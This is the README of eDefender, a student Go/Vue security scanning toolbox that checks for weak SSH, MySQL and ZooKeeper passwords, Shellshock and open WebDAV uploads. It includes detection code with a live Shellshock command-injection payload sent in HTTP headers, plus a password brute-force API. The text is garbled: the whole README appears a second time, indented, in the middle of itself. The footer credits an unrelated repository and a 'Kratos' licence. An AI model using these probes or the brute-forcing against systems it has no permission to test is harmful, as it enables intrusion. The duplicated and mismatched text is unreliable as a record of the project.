# eDefender
> 网络守卫者

## 开发背景

网上类似的安全产品很常见，但是很多框架/工具都有以下几个特点

* 使用太繁琐

* 代码可读性差

* 功能不够全

* 可拓展性低

于是我拍了拍头发不太多的脑袋，想做一个简单易用的工具。

## 项目介绍

e-defender是一个集大成的网络安全工具箱，可以支持弱密码检测、密码爆破、服务器状态检测、shell破壳检测等功能

## 技术选型

### 服务端

Go是一门非常年轻的语言，没有什么历史包袱。 10年诞生，直接抛弃了原有的严格意义上的面向对象的编程，从用户态抽象出协程这一大杀器，随便一台老笔记本轻轻松松几万个并发。

 并且go在云原生时代有天然的优势。诸如k8s，docker，prometheus，consul等中间件和基础设置的流行，使得go天生支持云原生。

 目前已经将go实践的公司有 哔哩哔哩，字节跳动，腾讯，百度，阿里巴巴，华为，谷歌等一二线大厂。

## 功能清单

* Zookeeper弱密码检测

* Mysql弱密码检测

* Ssh弱密码检测

* Shell破壳检测

* 服务器状态检测

## 开发环境

* Golang  v1.14

* Node v14.4.0
* Vue 2.6
* Vue-cli v4.4.4

## 启动

### 前端

安装依赖
```
npm install
```

开发环境运行

```
npm run serve
```

打包成可部署的html、js、css文件

```
npm run build
```

### 服务端

进入到cmd目录，执行如下命令

```bash
go run .
```

## 使用方式

### 命令行调用接口

* 直接接口访问

我们认为接口是一种比较好的使用方式，因为接口的调用方式比较多样，对于开发经验比较少的同学也可以直接复制下面的命令，调用方式如下：

* 查看插件列表

```bash
curl --location --request GET 'localhost:8067/api/pluginList'
```

请求结果

```json
[
    {
        "Request": "",
        "Response": "",
        "author": "wolf",
        "level": 0,
        "name": "SSH 弱口令",
        "references": {
            "cve": "",
            "kpid": "KP-0001",
            "url": ""
        },
        "remarks": "直接导致服务器被入侵控制。",
        "target": "ssh",
        "type": "WEAKPWD"
    },
    {
        "Request": "",
        "Response": "",
        "author": "cjp",
        "level": 0,
        "name": "MySQL 弱口令",
        "references": {
            "cve": "",
            "kpid": "KP-0005",
            "url": "https://www.cnblogs.com/yunsicai/p/4080864.html"
        },
        "remarks": "导致数据库敏感信息泄露，严重可导致服务器直接被入侵控制。",
        "target": "mysql",
        "type": "WEAKPWD"
    },
    {
        "Request": "",
        "Response": "",
        "author": "wolf",
        "level": 0,
        "name": "shellshock 破壳漏洞",
        "references": {
            "cve": "CVE-2014-6271",
            "kpid": "KP-0019",
            "url": "https://www.seebug.org/vuldb/ssvid-88877"
        },
        "remarks": "攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,最终完全控制目标系统",
        "target": "web",
        "type": "RCE"
    },
    {
        "Request": "",
        "Response": "",
        "author": "cjp",
        "level": 1,
        "name": "WebDav Put开启",
        "references": {
            "cve": "",
            "kpid": "KP-0022",
            "url": ""
        },
        "remarks": "开启了WebDav且配置不当导致攻击者可上传文件到web目录",
        "target": "web",
        "type": "CONF"
    },
    {
        "Request": "",
        "Response": "",
        "author": "cjp",
        "level": 2,
        "name": "zookeeper 未授权访问",
        "references": {
            "cve": "",
            "kpid": "KP-0029",
            "url": ""
        },
        "remarks": "导致敏感信息泄露。",
        "target": "zookeeper",
        "type": "UNAUTH"
    }
]
```

* 检查弱密码

```bash
curl --location --request POST 'localhost:8067/api/check' \
--header 'Content-Type: application/json' \
--data-raw '{
    "type": "service",
    "netloc": "localhost:3306",
    "target": "mysql",
    "meta":{
            "system": "",  
            "pathlist":[],
            "filelist":[],
            "passlist":["3123","3123"]
        }
}'
```

请求结果

```json
null
```

Type是指请求的类型，如果是网页类型的选择web，如果是测试的服务器端口，使用service，netloc是需要检查的接口，meta是一些额外字段，像弱密码检查的功能需要在passlist中加入需要测试的密码组

* 查看服务器状态

```bash
curl --location --request GET 'localhost:8067/api/info'
```

结果

```json
{
    "Mem": {
        "使用率": "60.34%",
        "可用": "6.81G",
        "已使用": "10.37G",
        "总量": "17.18G",
        "空闲": "0.54G"
    },
    "Cpu": [
        {
            "使用率": "64.04%",
            "型号": "Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz",
            "数量": "4"
        }
    ],
    "Host": {
        "主机名称": "MacBook-Pro.local",
        "内核": "x86_64",
        "平台": "darwin-10.15.6 Standalone Workstation",
        "系统": "darwin"
    },
    "Disk": null
}
```

调用info接口发送get请求，可以查看服务器的内存使用情况，cpu占用率，以及服务器信息，如果服务器有突发性的内存上涨或者占用率过高，可通过此接口来判断

### 使用前端

* 服务器状态展示

![image-20210609213939263](http://cdn.cjpa.top/image-20210609213939263.png)

* 插件列表展示

![](http://cdn.cjpa.top/image-20210609213939263.png)

* 开发者列表

![image-20210609214008468](http://cdn.cjpa.top/image-20210609214008468.png)

* 漏洞查询

![image-20210609214022694](http://cdn.cjpa.top/image-20210609214022694.png)

## 项目结构

```bash
.
├── CHANGELOG.md		# 变更日志
├── LICENSE					# 证书
├── OWNERS					# 所有者
├── README.md				# 说明文档
├── cmd
│   └── main.go			# 主函数
├── common					# 中间件
│   └── middleware
├── config					# 配置
│   ├── config.go
│   └── init.go
├── go.mod					# 依赖管理
├── go.sum
├── internal				# 内部包
│   ├── models				# 模型
│   ├── server				# web服务
│   └── service				# 主业务
├── logs							# 日志
│   └── toy-vote.log
├── pkg							# 工具包
│   ├── log
│   └── util
├── plugin
│   ├── goPlugins		# 安全插件
├── setting.yaml		# 配置文件
├── talk.pptx				# 演讲ppt
├── web							# 前端
```

## 配置文件

配置文件使用yaml的格式

```yaml
log:
  logFilePath: "." 				# 日志路径
  logFileName: "defender" # 日志名
  level: "debug" 					# 日志级别
  deployStage: "develop"	# 日志模式
  maxAge: 3								# 最大天数（超过这个天数，日志会新建一个）
  maxSize: 5							# 最大大小（以mb为单位）
server:
  port: "8067"						# 后台服务运行端口
  isCORS: true						# 是否开启跨域
service:
base:											# 欢迎banner
  welecome: "▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄\n
             ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n
             ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀█░█▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌\n
             ▐░▌                ▐░▌    ▐░▌       ▐░▌\n
             ▐░▌                ▐░▌    ▐░█▄▄▄▄▄▄▄█░▌\n
             ▐░▌                ▐░▌    ▐░░░░░░░░░░░▌\n
             ▐░▌                ▐░▌    ▐░█▀▀▀▀▀▀▀▀▀\n
             ▐░▌                ▐░▌    ▐░▌\n
             ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄█░▌    ▐░▌\n
             ▐░░░░░░░░░░░▌▐░░░░░░░▌    ▐░▌\n
              ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀      ▀\n"
```

## 核心模块

### Zk弱密码检测

弱密码检测就是想zk服务器发送一些默认的密码，如果zk有了响应，那么就可以判定改zk服务器存在弱密码泄露现象，实现代码如下

```go
func (d *zookeeperUnauth) Check(netloc string, meta plugin.TaskMeta) bool {
	buf, err := util.TCPSend(netloc, []byte("envi"), 15)
	if err != nil {
		fmt.Println(err.Error())
	}
	fmt.Println(string(buf))
	if err == nil && strings.Contains(string(buf), "Environment") {
		result := d.info
		result.Request = fmt.Sprintf("zookeeper://%s", netloc)
		result.Response = string(buf)
		result.Remarks = fmt.Sprintf("未授权访问，%s", result.Remarks)
		d.result = append(d.result, result)
		fmt.Println(d.result)
		return true
	}

	return false
}
```

### Shell破壳检测

2014年9月24日，一位名叫斯特凡·沙泽拉的安全研究者发现了一个名为“破壳”（Shellshock，也称为“bash门”或“Bash漏洞”）的bash漏洞。该漏洞如果被渗透，远程攻击者就可以在调用shell前通过在特别精心编制的环境中输出函数定义执行任何程序代码。然后，这些函数内的代码就可以在调用bash时立即执行。

来自CVSS的评分：破壳漏洞的严重性被定义为10级（最高），今年4月爆发的OpenSSL“心脏出血”漏洞才5级！

破壳漏洞存在有25年，和Bash年龄一样。

思路：

通过网站https://www.seebug.org/vuldb/ssvid-88877提供的破壳漏洞检测代码，我们使用想远程的地址发送() { :;};echo ; echo; echo $(/bin/ls -la /);命令，然后检查响应体，通过检查响应体中是否有drwxr-xr-x权限来判断是否能获取权限，虽然漏洞非常危险，但是检测起来思路还是比较明晰，实现代码如下：

```bash
func (d *shellShock) Check(URL string, meta plugin.TaskMeta) bool {
	if meta.System == "windows" {
		return false
	}
	var checkURL string
	for _, url := range meta.FileList {
		if strings.Contains(url, ".cgi") {
			checkURL = url
			break
		}
	}
	if checkURL == "" {
		return false
	}
	pocList := []string{
		"() { :;};echo ; echo; echo $(/bin/ls -la /);",
		// "{() { _; } >_[$($())] { /bin/expr 32001611 - 100; }}",
	}
	for _, poc := range pocList {
		request, err := http.NewRequest("GET", checkURL, nil)
		request.Header.Set("cookie", poc)
		request.Header.Set("User-Agent", poc)
		request.Header.Set("Referrer", poc)
		resp, err := util.RequestDo(request, true, 15)
		if err != nil {
			return false
		}
		if strings.Contains(resp.ResponseRaw, "drwxr-xr-x") && strings.Contains(resp.ResponseRaw, "etc") {
			result := d.info
			result.Response = resp.ResponseRaw
			result.Request = resp.RequestRaw
			d.result = append(d.result, result)
			return true
		}
	}
	return false
}

```

### Web dav检测

Web dav模块会检测web服务器是否开启了WebDav且配置不当导致攻击者可上传文件到web目录，实现逻辑就是会尝试发起put请求，然后想服务器发送一个测试文件，然后再使用get请求，看看能不能获取这个文件，实现代码如下

```go
func (d *webDav) Check(URL string, meta plugin.TaskMeta) bool {
	fmt.Println(URL)
	putURL := URL + "/" + util.GetRandomString(6) + ".txt"
	request, err := http.NewRequest("PUT", putURL, strings.NewReader("vultest"))
	if err != nil {
		fmt.Println(err.Error())
		log.Error(err)
		return false
	}
	_, err = util.RequestDo(request, false, 15)
	if err != nil {
		fmt.Println(err.Error())
		log.Error(err)
		return false
	}
	vRequest, err := http.NewRequest("GET", putURL, nil)
	if err != nil {
		fmt.Println(err.Error())
		log.Error(err)
		return false
	}
	resp, err := util.RequestDo(vRequest, true, 15)
	if err != nil {
		fmt.Println(err.Error())
		log.Error(err)
		return false
	}
	if strings.Contains(resp.ResponseRaw, "vultest") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
```

## 插件化

e-defender和一个比较核心的特性就是插件化，可以支持平滑的拓展，如果有新的功能想要加入，只需要在plugin/goPlugins中添加相关函数即可，新添加的这个对象只要实现了如下接口，就是一个可用的插件



// GoPlugin 插件接口

```go
 type GoPlugin interface {
  Init() Plugin
  Check(netloc string, meta TaskMeta) bool
  GetResult() []Plugin
 }
```

插件采用自注册的模式，这里使用了go语言的一个语法特性，在包初始化的时候将自己注册到pulgin树，如下是mysql弱密码检测插件自注册的代码

```go
func init() {
  plugin.Regist("mysql", &mysqlWeakPass{})
 }
```

## 工程效率实践

* 使用git作为版本控制工具

* 单测一定要补全

* Changelog记得写# eDefender
              > 网络守卫者
              
              ## 开发背景
              
              网上类似的安全产品很常见，但是很多框架/工具都有以下几个特点
              
              * 使用太繁琐
              
              * 代码可读性差
              
              * 功能不够全
              
              * 可拓展性低
              
              于是我拍了拍头发不太多的脑袋，想做一个简单易用的工具。
              
              ## 项目介绍
              
              e-defender是一个集大成的网络安全工具箱，可以支持弱密码检测、密码爆破、服务器状态检测、shell破壳检测等功能
              
              ## 技术选型
              
              ### 服务端
              
              Go是一门非常年轻的语言，没有什么历史包袱。 10年诞生，直接抛弃了原有的严格意义上的面向对象的编程，从用户态抽象出协程这一大杀器，随便一台老笔记本轻轻松松几万个并发。
              
               并且go在云原生时代有天然的优势。诸如k8s，docker，prometheus，consul等中间件和基础设置的流行，使得go天生支持云原生。
              
               目前已经将go实践的公司有 哔哩哔哩，字节跳动，腾讯，百度，阿里巴巴，华为，谷歌等一二线大厂。
              
              ## 功能清单
              
              * Zookeeper弱密码检测
              
              * Mysql弱密码检测
              
              * Ssh弱密码检测
              
              * Shell破壳检测
              
              * 服务器状态检测
              
              ## 开发环境
              
              * Golang  v1.14
              
              * Node v14.4.0
              * Vue 2.6
              * Vue-cli v4.4.4
              
              ## 启动
              
              ### 前端
              
              安装依赖
              ```
              npm install
              ```
              
              开发环境运行
              
              ```
              npm run serve
              ```
              
              打包成可部署的html、js、css文件
              
              ```
              npm run build
              ```
              
              ### 服务端
              
              进入到cmd目录，执行如下命令
              
              ```bash
              go run .
              ```
              
              ## 使用方式
              
              * 直接接口访问
              
              我们认为接口是一种比较好的使用方式，因为接口的调用方式比较多样，对于开发经验比较少的同学也可以直接复制下面的命令，调用方式如下：
              
              * 查看插件列表
              
              ```bash
              curl --location --request GET 'localhost:8067/api/pluginList'
              ```
              
              请求结果
              
              ```json
              [
                  {
                      "Request": "",
                      "Response": "",
                      "author": "wolf",
                      "level": 0,
                      "name": "SSH 弱口令",
                      "references": {
                          "cve": "",
                          "kpid": "KP-0001",
                          "url": ""
                      },
                      "remarks": "直接导致服务器被入侵控制。",
                      "target": "ssh",
                      "type": "WEAKPWD"
                  },
                  {
                      "Request": "",
                      "Response": "",
                      "author": "cjp",
                      "level": 0,
                      "name": "MySQL 弱口令",
                      "references": {
                          "cve": "",
                          "kpid": "KP-0005",
                          "url": "https://www.cnblogs.com/yunsicai/p/4080864.html"
                      },
                      "remarks": "导致数据库敏感信息泄露，严重可导致服务器直接被入侵控制。",
                      "target": "mysql",
                      "type": "WEAKPWD"
                  },
                  {
                      "Request": "",
                      "Response": "",
                      "author": "wolf",
                      "level": 0,
                      "name": "shellshock 破壳漏洞",
                      "references": {
                          "cve": "CVE-2014-6271",
                          "kpid": "KP-0019",
                          "url": "https://www.seebug.org/vuldb/ssvid-88877"
                      },
                      "remarks": "攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,最终完全控制目标系统",
                      "target": "web",
                      "type": "RCE"
                  },
                  {
                      "Request": "",
                      "Response": "",
                      "author": "cjp",
                      "level": 1,
                      "name": "WebDav Put开启",
                      "references": {
                          "cve": "",
                          "kpid": "KP-0022",
                          "url": ""
                      },
                      "remarks": "开启了WebDav且配置不当导致攻击者可上传文件到web目录",
                      "target": "web",
                      "type": "CONF"
                  },
                  {
                      "Request": "",
                      "Response": "",
                      "author": "cjp",
                      "level": 2,
                      "name": "zookeeper 未授权访问",
                      "references": {
                          "cve": "",
                          "kpid": "KP-0029",
                          "url": ""
                      },
                      "remarks": "导致敏感信息泄露。",
                      "target": "zookeeper",
                      "type": "UNAUTH"
                  }
              ]
              ```
              
              * 检查弱密码
              
              ```bash
              curl --location --request POST 'localhost:8067/api/check' \
              --header 'Content-Type: application/json' \
              --data-raw '{
                  "type": "service",
                  "netloc": "localhost:3306",
                  "target": "mysql",
                  "meta":{
                          "system": "",  
                          "pathlist":[],
                          "filelist":[],
                          "passlist":["3123","3123"]
                      }
              }'
              ```
              
              请求结果
              
              ```json
              null
              ```
              
              Type是指请求的类型，如果是网页类型的选择web，如果是测试的服务器端口，使用service，netloc是需要检查的接口，meta是一些额外字段，像弱密码检查的功能需要在passlist中加入需要测试的密码组
              
              * 查看服务器状态
              
              ```bash
              curl --location --request GET 'localhost:8067/api/info'
              ```
              
              结果
              
              ```json
              {
                  "Mem": {
                      "使用率": "60.34%",
                      "可用": "6.81G",
                      "已使用": "10.37G",
                      "总量": "17.18G",
                      "空闲": "0.54G"
                  },
                  "Cpu": [
                      {
                          "使用率": "64.04%",
                          "型号": "Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz",
                          "数量": "4"
                      }
                  ],
                  "Host": {
                      "主机名称": "MacBook-Pro.local",
                      "内核": "x86_64",
                      "平台": "darwin-10.15.6 Standalone Workstation",
                      "系统": "darwin"
                  },
                  "Disk": null
              }
              ```
              
              调用info接口发送get请求，可以查看服务器的内存使用情况，cpu占用率，以及服务器信息，如果服务器有突发性的内存上涨或者占用率过高，可通过此接口来判断
              
              ## 项目结构
              
              ```bash
              .
              ├── CHANGELOG.md		# 变更日志
              ├── LICENSE					# 证书
              ├── OWNERS					# 所有者
              ├── README.md				# 说明文档
              ├── cmd
              │   └── main.go			# 主函数
              ├── common					# 中间件
              │   └── middleware
              ├── config					# 配置
              │   ├── config.go
              │   └── init.go
              ├── go.mod					# 依赖管理
              ├── go.sum
              ├── internal				# 内部包
              │   ├── models				# 模型
              │   ├── server				# web服务
              │   └── service				# 主业务
              ├── logs							# 日志
              │   └── toy-vote.log
              ├── pkg							# 工具包
              │   ├── log
              │   └── util
              ├── plugin
              │   ├── goPlugins		# 安全插件
              ├── setting.yaml		# 配置文件
              ├── talk.pptx				# 演讲ppt
              ├── web							# 前端
              ```
              
              ## 核心模块
              
              ### Zk弱密码检测
              
              弱密码检测就是想zk服务器发送一些默认的密码，如果zk有了响应，那么就可以判定改zk服务器存在弱密码泄露现象，实现代码如下
              
              ```go
              func (d *zookeeperUnauth) Check(netloc string, meta plugin.TaskMeta) bool {
              	buf, err := util.TCPSend(netloc, []byte("envi"), 15)
              	if err != nil {
              		fmt.Println(err.Error())
              	}
              	fmt.Println(string(buf))
              	if err == nil && strings.Contains(string(buf), "Environment") {
              		result := d.info
              		result.Request = fmt.Sprintf("zookeeper://%s", netloc)
              		result.Response = string(buf)
              		result.Remarks = fmt.Sprintf("未授权访问，%s", result.Remarks)
              		d.result = append(d.result, result)
              		fmt.Println(d.result)
              		return true
              	}
              
              	return false
              }
              ```
              
              ### Shell破壳检测
              
              2014年9月24日，一位名叫斯特凡·沙泽拉的安全研究者发现了一个名为“破壳”（Shellshock，也称为“bash门”或“Bash漏洞”）的bash漏洞。该漏洞如果被渗透，远程攻击者就可以在调用shell前通过在特别精心编制的环境中输出函数定义执行任何程序代码。然后，这些函数内的代码就可以在调用bash时立即执行。
              
              来自CVSS的评分：破壳漏洞的严重性被定义为10级（最高），今年4月爆发的OpenSSL“心脏出血”漏洞才5级！
              
              破壳漏洞存在有25年，和Bash年龄一样。
              
              思路：
              
              通过网站https://www.seebug.org/vuldb/ssvid-88877提供的破壳漏洞检测代码，我们使用想远程的地址发送() { :;};echo ; echo; echo $(/bin/ls -la /);命令，然后检查响应体，通过检查响应体中是否有drwxr-xr-x权限来判断是否能获取权限，虽然漏洞非常危险，但是检测起来思路还是比较明晰，实现代码如下：
              
              ```bash
              func (d *shellShock) Check(URL string, meta plugin.TaskMeta) bool {
              	if meta.System == "windows" {
              		return false
              	}
              	var checkURL string
              	for _, url := range meta.FileList {
              		if strings.Contains(url, ".cgi") {
              			checkURL = url
              			break
              		}
              	}
              	if checkURL == "" {
              		return false
              	}
              	pocList := []string{
              		"() { :;};echo ; echo; echo $(/bin/ls -la /);",
              		// "{() { _; } >_[$($())] { /bin/expr 32001611 - 100; }}",
              	}
              	for _, poc := range pocList {
              		request, err := http.NewRequest("GET", checkURL, nil)
              		request.Header.Set("cookie", poc)
              		request.Header.Set("User-Agent", poc)
              		request.Header.Set("Referrer", poc)
              		resp, err := util.RequestDo(request, true, 15)
              		if err != nil {
              			return false
              		}
              		if strings.Contains(resp.ResponseRaw, "drwxr-xr-x") && strings.Contains(resp.ResponseRaw, "etc") {
              			result := d.info
              			result.Response = resp.ResponseRaw
              			result.Request = resp.RequestRaw
              			d.result = append(d.result, result)
              			return true
              		}
              	}
              	return false
              }
              
              ```
              
              ### Web dav检测
              
              Web dav模块会检测web服务器是否开启了WebDav且配置不当导致攻击者可上传文件到web目录，实现逻辑就是会尝试发起put请求，然后想服务器发送一个测试文件，然后再使用get请求，看看能不能获取这个文件，实现代码如下
              
              ```go
              func (d *webDav) Check(URL string, meta plugin.TaskMeta) bool {
              	fmt.Println(URL)
              	putURL := URL + "/" + util.GetRandomString(6) + ".txt"
              	request, err := http.NewRequest("PUT", putURL, strings.NewReader("vultest"))
              	if err != nil {
              		fmt.Println(err.Error())
              		log.Error(err)
              		return false
              	}
              	_, err = util.RequestDo(request, false, 15)
              	if err != nil {
              		fmt.Println(err.Error())
              		log.Error(err)
              		return false
              	}
              	vRequest, err := http.NewRequest("GET", putURL, nil)
              	if err != nil {
              		fmt.Println(err.Error())
              		log.Error(err)
              		return false
              	}
              	resp, err := util.RequestDo(vRequest, true, 15)
              	if err != nil {
              		fmt.Println(err.Error())
              		log.Error(err)
              		return false
              	}
              	if strings.Contains(resp.ResponseRaw, "vultest") {
              		result := d.info
              		result.Response = resp.ResponseRaw
              		result.Request = resp.RequestRaw
              		d.result = append(d.result, result)
              		return true
              	}
              	return false
              }
              ```
              
              ## 插件化
              
              e-defender和一个比较核心的特性就是插件化，可以支持平滑的拓展，如果有新的功能想要加入，只需要在plugin/goPlugins中添加相关函数即可，新添加的这个对象只要实现了如下接口，就是一个可用的插件
          
          
          ​    
          ​    
              // GoPlugin 插件接口
              
              ```go
               type GoPlugin interface {
                Init() Plugin
                Check(netloc string, meta TaskMeta) bool
                GetResult() []Plugin
               }
              ```
              
              插件采用自注册的模式，这里使用了go语言的一个语法特性，在包初始化的时候将自己注册到pulgin树，如下是mysql弱密码检测插件自注册的代码
              
              ```go
              func init() {
                plugin.Regist("mysql", &mysqlWeakPass{})
               }
              ```
              
              ## 工程效率实践
              
              * 使用git作为版本控制工具
              
              * 单测一定要补全
              
              * Changelog记得写
              
              * 能上docker就上docker
              
              ## 贡献者
              项目在课设上交之后会进行开源～
              
              地址 https://github.com/cjphaha/eDefender
              
              (゜-゜)つロ 干杯~-
          


* 能上docker就上docker

## 贡献者
项目在课设上交之后会进行开源～

地址 https://github.com/cjphaha/eDefender

(゜-゜)つロ 干杯~-

<a href="https://github.com/easy-code/etracer/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=easy-code/etracer" />
</a>

## 证书

Kratos is MIT licensed. See the [LICENSE](./LICENSE) file for details.